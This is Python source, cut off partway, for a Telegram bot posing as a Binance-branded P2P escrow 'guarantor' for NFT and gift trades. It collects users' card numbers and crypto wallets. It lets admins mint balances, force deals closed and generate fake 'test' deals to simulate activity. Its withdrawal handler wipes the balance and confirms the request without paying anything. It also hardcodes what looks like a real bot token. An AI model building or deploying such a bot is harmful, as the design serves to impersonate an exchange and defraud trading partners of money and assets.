import asyncio
import logging
import os
import sys
import signal
import random
import string
import json
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message, CallbackQuery, URLInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties

# ===== НАСТРОЙКИ =====
BOT_TOKEN = os.getenv("BOT_TOKEN", "8861957647:AAFhCw9cY6DgP_TGLXSdrjf7TIECimyr6-k")
INITIAL_ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "8297446667,8734750156,665396654,8734750156").split(",")]
BANNER_URL = os.getenv("BANNER_URL", "https://i.ibb.co/GQf936XW/IMG-0389.jpg")
PORT = int(os.getenv("PORT", 8080))
DATA_FILE = "data.json"

EMOJI = {
    "ton": "💎",
    "card": "💳",
    "user": "👤",
    "stars": "⭐",
    "usdt": "💵",
    "btc": "₿",
    "ruble": "₽",
    "people": "👥",
    "money": "💰",
    "briefcase": "💼",
    "coin": "🪙",
    "package": "📦",
    "lamp": "💡",
    "balance_icon": "💰",
}

SHIELD_FALLBACK = "🛡"

users = {}
deals = {}
deal_counter = 1000
invite_codes = {}
admin_ids = []

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# ===== СОХРАНЕНИЕ И ЗАГРУЗКА =====
def save_data():
    data = {
        "users": users,
        "deals": deals,
        "deal_counter": deal_counter,
        "invite_codes": invite_codes,
        "admin_ids": admin_ids
    }
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def load_data():
    global users, deals, deal_counter, invite_codes, admin_ids
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        users = data.get("users", {})
        deals = {int(k): v for k, v in data.get("deals", {}).items()}
        deal_counter = data.get("deal_counter", 1000)
        invite_codes = data.get("invite_codes", {})
        admin_ids = data.get("admin_ids", INITIAL_ADMIN_IDS)
    else:
        admin_ids = INITIAL_ADMIN_IDS
        save_data()

# ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
def is_admin(user_id):
    return user_id in admin_ids

def emoji(name):
    return EMOJI.get(name, "❓")

def shield_emoji():
    return SHIELD_FALLBACK

def welcome_text():
    return (
        f"{emoji('briefcase')} Добро пожаловать в Binance 🤝\n\n"
        "<blockquote>⚡️ Ваш надёжный P2P-гарант:\n"
        "1⃣ Автоматические сделки с NFT и подарками\n"
        f"2⃣ {shield_emoji()} Полная защита обеих сторон\n"
        f"3⃣ {emoji('coin')} Реферальная программа — 50% от комиссии\n"
        f"4⃣ {emoji('package')} Все сделки проходят через менеджера @binancesreport</blockquote>\n\n"
        f"{emoji('lamp')} Наш канал ─ @binance_announcements"
    )

ADMIN_TEXT = "👑 Админ-панель\n\nВыберите действие:"

class DealStates(StatesGroup):
    waiting_role = State()
    waiting_currency = State()
    waiting_amount = State()
    waiting_description = State()

class AdminStates(StatesGroup):
    waiting_user_id = State()
    waiting_deal_id = State()
    waiting_admin_add = State()
    waiting_admin_remove = State()

class SearchDeal(StatesGroup):
    waiting_code = State()

def get_lang(uid):
    return users.get(str(uid), {}).get("lang", "ru")

def username_or_id(uid):
    if uid is None: return "—"
    u = users.get(str(uid), {})
    if "username" in u and u["username"]: return f"@{u['username']}"
    return str(uid)

def deal_status_text(deal):
    if deal["status"] == "completed": return "Завершена ✅"
    if deal["status"] == "active":
        if deal["seller_id"] is None: return "Ожидание продавца"
        if deal["buyer_id"] is None: return "Ожидание покупателя"
        return "Проворачивание сделки"
    return deal["status"]

def generate_invite_code():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def has_any_rekv(uid):
    u = users.get(str(uid), {})
    return any(u.get(k) for k in ["ton","card","username","stars","usdt","btc"])

# ===== КЛАВИАТУРЫ =====
def main_menu(lang="ru"):
    t = {
        "ru": [f"{emoji('balance_icon')} Баланс", "📋 Мои сделки", "🤝 Создать сделку",
               "📄 Реквизиты", f"{emoji('people')} Рефералы", "🌐 Язык / Language", "🆘 Техподдержка"],
        "en": [f"{emoji('balance_icon')} Balance", "📋 My Deals", "🤝 New Deal",
               "📄 My Details", f"{emoji('people')} Referrals", "🌐 Language / Язык", "🆘 Support"]
    }[lang]
    callbacks = ["balance_menu", "my_deals", "new_deal", "my_rekv", "referrals", "change_lang"]
    kb = [
        [InlineKeyboardButton(text=t[0], callback_data=callbacks[0]),
         InlineKeyboardButton(text=t[1], callback_data=callbacks[1])],
        [InlineKeyboardButton(text=t[2], callback_data=callbacks[2]),
         InlineKeyboardButton(text=t[3], callback_data=callbacks[3])],
        [InlineKeyboardButton(text=t[4], callback_data=callbacks[4]),
         InlineKeyboardButton(text=t[5], callback_data=callbacks[5])],
        [InlineKeyboardButton(text=t[6], url="https://t.me/binancesreport")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def admin_menu():
    kb = [
        [InlineKeyboardButton(text=f"{emoji('money')} Пополнить баланс", callback_data="admin_add_balance")],
        [InlineKeyboardButton(text="✅ Завершить сделку", callback_data="admin_complete_deal")],
        [InlineKeyboardButton(text="📋 Все сделки", callback_data="admin_all_deals")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="🔢 Тестовые сделки", callback_data="admin_fake_deals")],
        [InlineKeyboardButton(text="➕ Выдать админку", callback_data="admin_add_admin")],
        [InlineKeyboardButton(text="➖ Убрать админку", callback_data="admin_remove_admin")],
        [InlineKeyboardButton(text="👥 Список админов", callback_data="admin_list_admins")],
        [InlineKeyboardButton(text="🔙 В главное меню", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def balance_menu(lang="ru"):
    t = {"ru": ["📜 История", "💸 Вывод", "🔙 Назад"],
         "en": ["📜 History", "💸 Withdraw", "🔙 Back"]}[lang]
    kb = [
        [InlineKeyboardButton(text=t[0], callback_data="tx_history")],
        [InlineKeyboardButton(text=t[1], callback_data="withdraw_funds")],
        [InlineKeyboardButton(text=t[2], callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def rekv_menu(lang="ru"):
    items = ["ton","card","username","stars","usdt","btc"]
    labels_ru = [f"{emoji('ton')} TON", f"{emoji('card')} Карта", f"{emoji('user')} Юзернейм",
                 f"{emoji('stars')} Звезды", f"{emoji('usdt')} USDT", f"{emoji('btc')} BTC"]
    labels_en = [f"{emoji('ton')} TON", f"{emoji('card')} Card", f"{emoji('user')} Username",
                 f"{emoji('stars')} Stars", f"{emoji('usdt')} USDT", f"{emoji('btc')} BTC"]
    labels = labels_ru if lang=="ru" else labels_en
    kb = []
    for i in range(6):
        kb.append([InlineKeyboardButton(text=labels[i], callback_data=f"set_{items[i]}")])
    kb.append([InlineKeyboardButton(text="🔙 Назад" if lang=="ru" else "🔙 Back", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def deal_role_choice(lang="ru"):
    t = {"ru": ["🛒 Я продавец", "🛍 Я покупатель", "🔙 Отмена"],
         "en": ["🛒 I'm Seller", "🛍 I'm Buyer", "🔙 Cancel"]}[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t[0], callback_data="role_seller")],
        [InlineKeyboardButton(text=t[1], callback_data="role_buyer")],
        [InlineKeyboardButton(text=t[2], callback_data="main_menu")]
    ])

def currency_choice(lang="ru"):
    cur = [(f"{emoji('ton')} TON", "ton"), (f"{emoji('card')} Карта", "card"),
           (f"{emoji('user')} Юзернейм", "username"), (f"{emoji('stars')} Звезды", "stars"),
           (f"{emoji('usdt')} USDT", "usdt"), (f"{emoji('btc')} BTC", "btc")]
    kb = []
    for c in cur:
        kb.append([InlineKeyboardButton(text=c[0], callback_data=f"cur_{c[1]}")])
    kb.append([InlineKeyboardButton(text="🔙 Отмена" if lang=="ru" else "🔙 Cancel", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def back_button(lang="ru"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад" if lang=="ru" else "🔙 Back", callback_data="main_menu")]
    ])

# ===== УТИЛИТЫ ОТПРАВКИ =====
async def _delete_message(chat_id, msg_id):
    try: await bot.delete_message(chat_id, msg_id)
    except: pass

async def delete_and_send_banner(call: CallbackQuery, caption: str, reply_markup=None):
    await call.answer()
    await _delete_message(call.message.chat.id, call.message.message_id)
    new_msg = None
    if BANNER_URL:
        try:
            new_msg = await call.message.answer_photo(
                URLInputFile(BANNER_URL),
                caption=caption,
                reply_markup=reply_markup,
                parse_mode="HTML"
            )
        except: pass
    if not new_msg:
        new_msg = await call.message.answer(caption, reply_markup=reply_markup, parse_mode="HTML")
    users.setdefault(str(call.from_user.id), {})["last_menu_msg_id"] = new_msg.message_id

async def delete_and_send_text(call: CallbackQuery, text: str, reply_markup=None):
    await call.answer()
    await _delete_message(call.message.chat.id, call.message.message_id)
    new_msg = await call.message.answer(text, reply_markup=reply_markup, parse_mode="HTML")
    users.setdefault(str(call.from_user.id), {})["last_menu_msg_id"] = new_msg.message_id

async def return_to_main(call: CallbackQuery, lang: str):
    uid = str(call.from_user.id)
    await call.answer()
    await _delete_message(call.message.chat.id, call.message.message_id)
    new_msg = None
    caption = welcome_text()
    if BANNER_URL:
        try:
            new_msg = await call.message.answer_photo(
                URLInputFile(BANNER_URL),
                caption=caption,
                reply_markup=main_menu(lang),
                parse_mode="HTML"
            )
        except: pass
    if not new_msg:
        new_msg = await call.message.answer(caption, reply_markup=main_menu(lang), parse_mode="HTML")
    users[uid]["last_menu_msg_id"] = new_msg.message_id

async def complete_deal_logic(deal_id, msg=None, call=None):
    d = deals[deal_id]
    seller_id = d["seller_id"]
    buyer_id = d["buyer_id"]
    amt = d["amount"]

    if seller_id is None or buyer_id is None:
        txt = "❌ Нельзя завершить сделку: отсутствует продавец или покупатель."
        if msg: await msg.answer(txt)
        if call: await call.message.edit_text(txt)
        return

    buyer_balance = users.get(str(buyer_id), {}).get("balance", 0)
    if buyer_balance < amt:
        txt = f"❌ У покупателя (ID {buyer_id}) недостаточно средств. Баланс: {buyer_balance} {emoji('ruble')}, требуется: {amt} {emoji('ruble')}."
        if msg: await msg.answer(txt)
        if call: await call.message.edit_text(txt)
        return

    users[str(buyer_id)]["balance"] -= amt
    users[str(buyer_id)].setdefault("history", []).append(f"💸 Сделка #{deal_id}: -{amt} {emoji('ruble')}")

    if str(seller_id) not in users:
        users[str(seller_id)] = {"balance": 0, "history": [], "completed_deals": 0}
    users[str(seller_id)]["balance"] += amt
    users[str(seller_id)].setdefault("history", []).append(f"✅ Сделка #{deal_id}: +{amt} {emoji('ruble')}")
    users[str(seller_id)]["completed_deals"] = users[str(seller_id)].get("completed_deals", 0) + 1

    d["status"] = "completed"
    txt = f"✅ Сделка #{deal_id} завершена. Продавец получил {amt} {emoji('ruble')}."
    if msg: await msg.answer(txt)
    if call: await call.message.edit_text(txt, reply_markup=admin_menu())
    try:
        await bot.send_message(seller_id, f"✅ Сделка #{deal_id} завершена! +{amt} {emoji('ruble')}.")
        await bot.send_message(buyer_id, f"✅ Сделка #{deal_id} завершена. С вашего баланса списано {amt} {emoji('ruble')}.")
    except: pass
    save_data()

# ===== ОБРАБОТЧИК ПРИСОЕДИНЕНИЯ ПО КОДУ =====
async def join_deal_by_code(message: Message, code: str):
    uid = str(message.from_user.id)
    deal_id = invite_codes.get(code)
    if not deal_id or deal_id not in deals:
        return await message.answer("❌ Сделка не найдена или код недействителен.")
    deal = deals[deal_id]
    if deal["status"] != "active":
        return await message.answer("❌ Эта сделка уже не активна.")
    if deal["seller_id"] is None and deal["buyer_id"] != uid:
        deal["seller_id"] = uid
    elif deal["buyer_id"] is None and deal["seller_id"] != uid:
        deal["buyer_id"] = uid
    else:
        return await message.answer("❌ Вы уже участвуете или сделка заполнена.")
    if deal["seller_id"] is not None and deal["buyer_id"] is not None:
        deal["status"] = "active"
    other_id = deal["seller_id"] if deal["seller_id"] != uid else deal["buyer_id"]
    if other_id:
        try:
            await bot.send_message(other_id,
                f"ℹ️ Вторая сторона присоединилась к сделке #{deal_id}.\n"
                f"Продавец: {username_or_id(deal['seller_id'])}\n"
                f"Покупатель: {username_or_id(deal['buyer_id'])}\n"
                f"Статус: {deal_status_text(deal)}\n"
                f"Сумма: {deal['amount']} {deal['currency']}"
            )
        except: pass
    await message.answer(
        f"✅ Вы присоединились к сделке #{deal_id}!\n\n"
        f"Продавец: {username_or_id(deal['seller_id'])}\n"
        f"Покупатель: {username_or_id(deal['buyer_id'])}\n"
        f"Статус: {deal_status_text(deal)}\n"
        f"Сумма: {deal['amount']} {deal['currency']}",
        reply_markup=main_menu(get_lang(uid))
    )
    save_data()

# ===== ХЕНДЛЕРЫ =====
@dp.message(Command("start"))
async def cmd_start(message: Message):
    uid = str(message.from_user.id)
    args = message.text.split()
    ref_id = None

    if len(args) > 1 and args[1].startswith("join_"):
        code = args[1][5:]
        return await join_deal_by_code(message, code)

    if uid not in users:
        users[uid] = {
            "balance": 0.0, "ton": "", "card": "", "username": "", "stars": "", "usdt": "", "btc": "",
            "lang": "ru", "history": [], "pending_rekv": None, "referrer_id": None, "referrals": [],
            "last_menu_msg_id": None, "completed_deals": 0, "ref_earned_ton": 0.0,
        }
    if len(args) > 1:
        try: ref_id = int(args[1])
        except: ref_id = None
    if ref_id and str(ref_id) != uid and str(ref_id) in users:
        users[uid]["referrer_id"] = str(ref_id)
        users[str(ref_id)]["balance"] += 2.0
        users[str(ref_id)].setdefault("history", []).append(f"🎁 Реферал: +2 {emoji('ruble')} от {uid}")
        users[str(ref_id)].setdefault("referrals", []).append(uid)
        try: await bot.send_message(str(ref_id), f"🎁 +2 {emoji('ruble')} за друга!")
        except: pass
    save_data()

    last_msg_id = users[uid].get("last_menu_msg_id")
    if last_msg_id:
        await _delete_message(message.chat.id, last_msg_id)

    caption = welcome_text()
    new_msg = None
    if BANNER_URL:
        try:
            new_msg = await message.answer_photo(
                URLInputFile(BANNER_URL),
                caption=caption,
                reply_markup=main_menu(get_lang(uid)),
                parse_mode="HTML"
            )
        except: pass
    if not new_msg:
        new_msg = await message.answer(caption, reply_markup=main_menu(get_lang(uid)), parse_mode="HTML")
    users[uid]["last_menu_msg_id"] = new_msg.message_id
    save_data()

@dp.message(Command("join"))
async def join_cmd(message: Message):
    try:
        code = message.text.split()[1]
        await join_deal_by_code(message, code)
    except:
        await message.answer("❌ Используйте: /join <код>")

@dp.message(F.text.regexp(r'#([a-zA-Z0-9]{8})'))
async def join_by_hashtag(message: Message):
    code = message.text.strip()[1:9]
    await join_deal_by_code(message, code)

# ===== АДМИН-КОМАНДЫ =====
@dp.message(Command("admin"))
async def admin_cmd(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer("❌ Нет доступа.")
    await message.answer(ADMIN_TEXT, reply_markup=admin_menu())

@dp.message(Command("masterb"))
async def masterb_cmd(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer("❌ Нет доступа.")
    try:
        _, uid_s, amt_s = message.text.split()
        uid, amt = int(uid_s), float(amt_s)
        users.setdefault(str(uid), {"balance":0,"history":[]})
        users[str(uid)]["balance"] += amt
        users[str(uid)].setdefault("history",[]).append(f"⚡ Зачисление: +{amt} {emoji('ruble')}")
        await message.answer(f"✅ Пользователю {uid} выдано {amt} {emoji('ruble')}.")
        try: await bot.send_message(uid, f"💰 На ваш баланс зачислено {amt} {emoji('ruble')}.")
        except: pass
        save_data()
    except: await message.answer("❌ Формат: /masterb user_id сумма")

@dp.message(Command("giveMas"))
async def givemas_cmd(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer("❌ Нет доступа.")
    try:
        _, did_s = message.text.split()
        did = int(did_s)
        if did not in deals or deals[did]["status"] != "active":
            return await message.answer("❌ Сделка не найдена или неактивна.")
        await complete_deal_logic(did, msg=message)
    except: await message.answer("❌ Формат: /giveMas deal_id")

# ===== ГЛАВНОЕ МЕНЮ =====
@dp.callback_query(F.data == "main_menu")
async def main_menu_cb(call: CallbackQuery):
    await return_to_main(call, get_lang(str(call.from_user.id)))

# ===== АДМИН КОЛБЭКИ =====
@dp.callback_query(F.data == "admin_add_balance")
async def adm_add_bal(call: CallbackQuery, state: FSMContext):
    if not is_admin(call.from_user.id):
        return await call.answer("❌", show_alert=True)
    await delete_and_send_text(call, "Введите ID пользователя и сумму через пробел:\nПример: 123456789 500", back_button("ru"))
    await state.set_state(AdminStates.waiting_user_id)

@dp.message(AdminStates.waiting_user_id)
async def adm_bal_proc(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    try:
        uid_s, amt_s = message.text.split()
        uid, amt = int(uid_s), float(amt_s)
        users.setdefault(str(uid), {"balance":0,"history":[]})
        users[str(uid)]["balance"] += amt
        users[str(uid)].setdefault("history",[]).append(f"⚡ Админ: +{amt} {emoji('ruble')}")
        await message.answer(f"✅ Баланс {uid} пополнен на {amt} {emoji('ruble')}.", reply_markup=admin_menu())
        save_data()
    except: await message.answer("❌ Формат: user_id сумма")
    await state.clear()

@dp.callback_query(F.data == "admin_complete_deal")
async def adm_compl(call: CallbackQuery, state: FSMContext):
    if not is_admin(call.from_user.id):
        return await call.answer("❌", show_alert=True)
    await delete_and_send_text(call, "Введите ID сделки для завершения:", back_button("ru"))
    await state.set_state(AdminStates.waiting_deal_id)

@dp.message(AdminStates.waiting_deal_id)
async def adm_compl_proc(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    try:
        did = int(message.text.strip())
        if did not in deals or deals[did]["status"]!="active":
            return await message.answer("❌ Сделка не найдена или неактивна.", reply_markup=admin_menu())
        await complete_deal_logic(did, msg=message)
    except: await message.answer("❌ Введите корректный ID сделки.")
    await state.clear()

@dp.callback_query(F.data == "admin_all_deals")
async def adm_all_deals(call: CallbackQuery):
    if not is_admin(call.from_user.id):
        return await call.answer("❌", show_alert=True)
    if not deals: return await delete_and_send_text(call, "📭 Сделок нет.", admin_menu())
    txt = "📋 Все сделки:\n\n" + "\n".join(
        [f"<b>#{did}</b>: {d['amount']} {d['currency']} | Продавец: {username_or_id(d['seller_id'])} | Покупатель: {username_or_id(d['buyer_id'])} | Статус: {deal_status_text(d)}" for did,d in deals.items()]
    )
    await delete_and_send_text(call, txt, admin_menu())

@dp.callback_query(F.data == "admin_stats")
async def adm_stats(call: CallbackQuery):
    if not is_admin(call.from_user.id):
        return await call.answer("❌", show_alert=True)
    total_users = len(users)
    total_deals = len(deals)
    active_deals = sum(1 for d in deals.values() if d["status"] == "active")
    total_balance = sum(u.get("balance", 0) for u in users.values())
    txt = f"📊 Статистика:\n\n<b>Пользователей:</b> {total_users}\n<b>Сделок:</b> {total_deals}\n<b>Активных:</b> {active_deals}\n<b>Общий баланс:</b> {total_balance} {emoji('ruble')}"
    await delete_and_send_text(call, txt, admin_menu())

@dp.callback_query(F.data == "admin_fake_deals")
async def adm_fake(call: CallbackQuery):
    if not is_admin(call.from_user.id):
        return await call.answer("❌", show_alert=True)
    global deal_counter
    cur_list = ["ton","card","username","stars","usdt","btc"]
    cnt = random.randint(0, 40)
    for _ in range(cnt):
        deal_counter += 1
        code = generate_invite_code()
        while code in invite_codes:
            code = generate_invite_code()
        invite_codes[code] = deal_counter
        deals[deal_counter] = {
            "seller_id": random.choice(list(users.keys())) if users else admin_ids[0],
            "buyer_id": random.choice(list(users.keys())) if users else admin_ids[0],
            "amount": round(random.uniform(100, 10000), 2),
            "currency": random.choice(cur_list),
            "status": "active",
            "invite_code": code,
            "description": "Тестовая сделка"
        }
    save_data()
    await delete_and_send_text(call, f"✅ Создано {cnt} тестовых сделок.", admin_menu())

# ===== УПРАВЛЕНИЕ АДМИНАМИ =====
@dp.callback_query(F.data == "admin_add_admin")
async def admin_add_admin_start(call: CallbackQuery, state: FSMContext):
    if not is_admin(call.from_user.id):
        return await call.answer("❌", show_alert=True)
    await call.answer()
    await call.message.answer("Введите ID пользователя, которого нужно сделать администратором:")
    await state.set_state(AdminStates.waiting_admin_add)

@dp.message(AdminStates.waiting_admin_add)
async def admin_add_admin_process(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    try:
        new_admin = int(message.text.strip())
        if new_admin in admin_ids:
            await message.answer("❌ Этот пользователь уже администратор.")
        else:
            admin_ids.append(new_admin)
            save_data()
            await message.answer(f"✅ Пользователь {new_admin} теперь администратор.")
    except:
        await message.answer("❌ Введите корректный ID.")
    await state.clear()

@dp.callback_query(F.data == "admin_remove_admin")
async def admin_remove_admin_start(call: CallbackQuery, state: FSMContext):
    if not is_admin(call.from_user.id):
        return await call.answer("❌", show_alert=True)
    await call.answer()
    await call.message.answer("Введите ID администратора, которого нужно удалить:")
    await state.set_state(AdminStates.waiting_admin_remove)

@dp.message(AdminStates.waiting_admin_remove)
async def admin_remove_admin_process(message: Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    try:
        rem_admin = int(message.text.strip())
        if rem_admin not in admin_ids:
            await message.answer("❌ Этот пользователь не является администратором.")
        elif len(admin_ids) == 1:
            await message.answer("❌ Нельзя удалить последнего администратора.")
        else:
            admin_ids.remove(rem_admin)
            save_data()
            await message.answer(f"✅ Администратор {rem_admin} удалён.")
    except:
        await message.answer("❌ Введите корректный ID.")
    await state.clear()

@dp.callback_query(F.data == "admin_list_admins")
async def admin_list_admins(call: CallbackQuery):
    if not is_admin(call.from_user.id):
        return await call.answer("❌", show_alert=True)
    text = "👥 Текущие администраторы:\n" + "\n".join(f"• {uid}" for uid in admin_ids)
    await call.message.answer(text)
    await call.answer()

# ===== БАЛАНС =====
@dp.callback_query(F.data == "balance_menu")
async def balance_menu_handler(call: CallbackQuery):
    uid = str(call.from_user.id); lang = get_lang(uid)
    bal = users.get(uid, {}).get("balance", 0)
    completed = users.get(uid, {}).get("completed_deals", 0)
    if bal == 0:
        balance_line = "💔 Ваш баланс пока пуст"
    else:
        balance_line = f"{emoji('balance_icon')} Ваш баланс: <b>{bal:.2f}</b> {emoji('ruble')}"
    txt = (
        f"{emoji('balance_icon')} <b>Ваш баланс:</b>\n\n"
        f"{balance_line}\n\n"
        f"📈 Завершённых сделок: <b>{completed}</b>"
    )
    await delete_and_send_banner(call, txt, balance_menu(lang))

@dp.callback_query(F.data == "tx_history")
async def tx_history_handler(call: CallbackQuery):
    uid = str(call.from_user.id); lang = get_lang(uid)
    h = users.get(uid, {}).get("history", [])
    txt = "📜 История транзакций:\n" + ("\n".join(h[-15:]) if h else "Пусто")
    await delete_and_send_text(call, txt, back_button(lang))

@dp.callback_query(F.data == "withdraw_funds")
async def withdraw_funds_handler(call: CallbackQuery):
    uid = str(call.from_user.id); lang = get_lang(uid)
    b = users.get(uid, {}).get("balance", 0)
    if b <= 0:
        await call.answer("❌ Недостаточно средств" if lang=="ru" else "❌ Insufficient funds", show_alert=True)
        return
    users[uid]["balance"] = 0.0
    users[uid].setdefault("history", []).append(f"💸 Вывод: -{b:.2f} {emoji('ruble')}")
    await delete_and_send_text(call, f"✅ Заявка на вывод <b>{b:.2f}</b> {emoji('ruble')} принята.", back_button(lang))
    save_data()

# ===== РЕКВИЗИТЫ =====
@dp.callback_query(F.data == "my_rekv")
async def rekv_handler(call: CallbackQuery):
    uid = str(call.from_user.id); lang = get_lang(uid)
    u = users.get(uid, {})
    lbl = {"ton":f"{emoji('ton')} TON","card":f"{emoji('card')} Карта","username":f"{emoji('user')} Юзернейм",
           "stars":f"{emoji('stars')} Звезды","usdt":f"{emoji('usdt')} USDT","btc":f"{emoji('btc')} BTC"}
    entries = [f"{v}: {u.get(k, '❌ не указан')}" for k,v in lbl.items()]
    txt = "📄 Ваши реквизиты для получения средств:\n\n" + "\n".join(entries)
    await delete_and_send_text(call, txt, rekv_menu(lang))

for cb, key in [("set_ton","ton"),("set_card","card"),("set_username","username"),
                ("set_stars","stars"),("set_usdt","usdt"),("set_btc","btc")]:
    @dp.callback_query(F.data == cb)
    async def ask_rekv(call: CallbackQuery, key=key):
        uid = str(call.from_user.id); lang = get_lang(uid)
        prompts = {
            "ton": (f"Введите {emoji('ton')} TON кошелёк:", f"Enter {emoji('ton')} TON wallet:"),
            "card": (f"Введите {emoji('card')} номер карты:", f"Enter {emoji('card')} card number:"),
            "username": (f"Введите {emoji('user')} юзернейм:", f"Enter {emoji('user')} username:"),
            "stars": (f"Введите {emoji('stars')} ID звёзд:", f"Enter {emoji('stars')} Stars ID:"),
            "usdt": (f"Введите {emoji('usdt')} USDT кошелёк:", f"Enter {emoji('usdt')} USDT wallet:"),
            "btc": (f"Введите {emoji('btc')} BTC кошелёк:", f"Enter {emoji('btc')} BTC wallet:")
        }
        users[uid]["pending_rekv"] = key
        await delete_and_send_text(call, prompts[key][0] if lang=="ru" else prompts[key][1], back_button(lang))

# ===== СОЗДАНИЕ СДЕЛКИ =====
@dp.callback_query(F.data == "new_deal")
async def new_deal_handler(call: CallbackQuery, state: FSMContext):
    uid = str(call.from_user.id)
    if not has_any_rekv(uid):
        await call.answer("❗ Привяжите реквизиты перед созданием сделки", show_alert=True)
        return
    await state.clear()
    lang = get_lang(uid)
    txt = (
        "🤝 Создание P2P сделки\n\n"
        "Выберите свою роль в сделке:\n"
        "• Продавец — вы получите оплату после подтверждения менеджером @binancesreport.\n"
        "• Покупатель — вы получите товар после оплаты."
    ) if lang=="ru" else (
        "🤝 New P2P deal\n\n"
        "Choose your role:\n"
        "• Seller — you'll receive payment after confirmation by manager @binancesreport.\n"
        "• Buyer — you'll receive the item after payment."
    )
    await delete_and_send_banner(call, txt, deal_role_choice(lang))
    await state.set_state(DealStates.waiting_role)

@dp.callback_query(F.data.startswith("role_"), DealStates.waiting_role)
async def role_chosen(call: CallbackQuery, state: FSMContext):
    role = "seller" if call.data == "role_seller" else "buyer"
    await state.update_data(role=role)
    lang = get_lang(str(call.from_user.id))
    await delete_and_send_banner(call, "Выберите валюту, которой продавец получит деньги:", currency_choice(lang))
    await state.set_state(DealStates.waiting_currency)

@dp.callback_query(F.data.startswith("cur_"), DealStates.waiting_currency)
async def currency_chosen(call: CallbackQuery, state: FSMContext):
    cur = call.data.replace("cur_", "")
    await state.update_data(currency=cur)
    lang = get_lang(str(call.from_user.id))
    await delete_and_send_banner(call, f"💰 Введите сумму сделки (в {emoji('ruble')}):", back_button(lang))
    await state.set_state(DealStates.waiting_amount)

@dp.callback_query(F.data == "new_deal", DealStates.waiting_amount)
async def back_to_new_deal_from_amount(call: CallbackQuery, state: FSMContext):
    await state.clear()
    await new_deal_handler(call, state)

@dp.callback_query(F.data == "main_menu", DealStates.waiting_amount)
async def main_menu_from_amount(call: CallbackQuery, state: FSMContext):
    await state.clear()
    await main_menu_cb(call)

@dp.message(DealStates.waiting_amount)
async def amount_entered(message: Message, state: FSMContext):
    uid = str(message.from_user.id)
    lang = get_lang(uid)
    try:
        amt = float(message.text)
        if amt <= 0: raise ValueError
    except:
        return await message.answer("❌ Введите корректное положительное число.")
    await state.update_data(amount=amt)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="new_deal")],
        [InlineKeyboardButton(text="🏠 В меню", callback_data="main_menu")]
    ])
    txt = (
        f"✍️ Опишите предмет сделки:\n\n"
        f"Например: https://t.me/nft/\n"
        f"или просто текстовое описание товара"
    ) if lang=="ru" else (
        f"✍️ Describe the item:\n\n"
        f"Example: https://t.me/nft/\n"
        f"or just a text description"
    )
    await message.answer(txt, reply_markup=kb)
    await state.set_state(DealStates.waiting_description)

@dp.message(DealStates.waiting_description)
async def description_entered(message: Message, state: FSMContext):
    global deal_counter
    uid = str(message.from_user.id)
    lang = get_lang(uid)
    description = message.text.strip()
    data = await state.get_data()
    role = data["role"]
    currency = data["currency"]
    amount = data["amount"]

    code = generate_invite_code()
    while code in invite_codes:
        code = generate_invite_code()
    deal_counter += 1
    invite_codes[code] = deal_counter

    seller_id = uid if role == "seller" else None
    buyer_id = uid if role == "buyer" else None

    deals[deal_counter] = {
        "seller_id": seller_id,
        "buyer_id": buyer_id,
        "amount": amount,
        "currency": currency,
        "description": description,
        "status": "active",
        "invite_code": code
    }

    bot_username = (await bot.me()).username
    join_link = f"https://t.me/{bot_username}?start=join_{code}"
    text = (
        f"✅ Сделка #{deal_counter} успешно создана!\n\n"
        f"🛒 Роль: {'Продавец' if role=='seller' else 'Покупатель'}\n"
        f"🇷🇺 Валюта: {currency}\n"
        f"💰 Сумма: {amount} {emoji('ruble')}\n"
        f"✍️ Описание: {description}\n\n"
        f"🔗 Ссылка для второй стороны:\n{join_link}\n\n"
        f"Или пригласите через инлайн: @{bot_username} #{code}"
    )
    await message.answer(text, reply_markup=main_menu(lang))
    await state.clear()
    save_data()

# ===== МОИ СДЕЛКИ =====
@dp.callback_query(F.data == "my_deals")
async def my_deals_handler(call: CallbackQuery):
    uid = str(call.from_user.id); lang = get_lang(uid)
    user_deals = [(did, d) for did, d in deals.items() if d["seller_id"] == uid or d["buyer_id"] == uid]
    total = len(user_deals)
    completed = sum(1 for did, d in user_deals if d["status"] == "completed")

    kb = []
    if user_deals:
        for did, d in user_deals[:5]:
            status_icon = "✅" if d["status"] == "completed" else "❌"
            kb.append([InlineKeyboardButton(
                text=f"{status_icon} Сделка #{did}",
                callback_data=f"deal_info_{did}"
            )])
        if total > 5:
            kb.append([
                InlineKeyboardButton(text="◀️", callback_data="deals_page_prev"),
                InlineKeyboardButton(text="1/1", callback_data="ignore"),
